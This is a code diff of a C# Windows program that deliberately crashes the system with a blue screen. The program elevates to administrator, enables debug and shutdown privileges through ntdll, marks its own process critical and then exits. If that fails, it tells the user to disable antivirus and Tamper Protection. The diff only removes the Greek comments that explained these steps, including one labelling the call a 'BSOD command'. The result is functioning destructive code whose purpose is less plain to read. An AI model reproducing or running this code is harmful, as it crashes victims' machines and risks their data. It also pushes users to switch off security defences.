@@ -5,7 +5,7 @@ using System.Security.Principal;
 
 class Program
 {
-    // Εισαγωγή συναρτήσεων από το ntdll.dll
+    
     [DllImport("ntdll.dll")]
     public static extern int RtlAdjustPrivilege(int privilege, bool bEnable, bool bCurrentThread, out bool bPrev);
 
@@ -14,7 +14,7 @@ class Program
 
     static void Main(string[] args)
     {
-        // 1. Έλεγχος αν το πρόγραμμα τρέχει ως Admin
+        
         if (!IsAdministrator())
         {
             RestartAsAdmin();
@@ -28,26 +28,26 @@ class Program
         {
             Console.WriteLine("\nExecuting...");
 
-            // 2. ΕΝΕΡΓΟΠΟΙΗΣΗ ΠΡΟΝΟΜΙΩΝ (Το βήμα που έλειπε)
-            // Το 20 είναι το SeDebugPrivilege, απαραίτητο για critical processes
+        
+            
             bool prev;
             RtlAdjustPrivilege(20, true, false, out prev);
 
-            // Το 19 είναι το SeShutdownPrivilege
+            
             RtlAdjustPrivilege(19, true, false, out prev);
 
-            // 3. Εντολή BSOD
+            
             bool old;
             int status = RtlSetProcessIsCritical(true, out old, false);
 
             if (status == 0) // 0 = Success
             {
-                // Το σύστημα θα κρασάρει ακαριαία εδώ
+                
                 Environment.Exit(0);
             }
             else
             {
-                // Αν αποτύχει, θα μας πει τον κωδικό
+               
                 Console.WriteLine("\nFailed! Status code: " + status);
                 Console.WriteLine("Try disabling Antivirus/Tamper Protection.");
                 Console.ReadLine();
@@ -74,4 +74,5 @@ class Program
         };
         try { Process.Start(startInfo); } catch { }
     }
+
 }
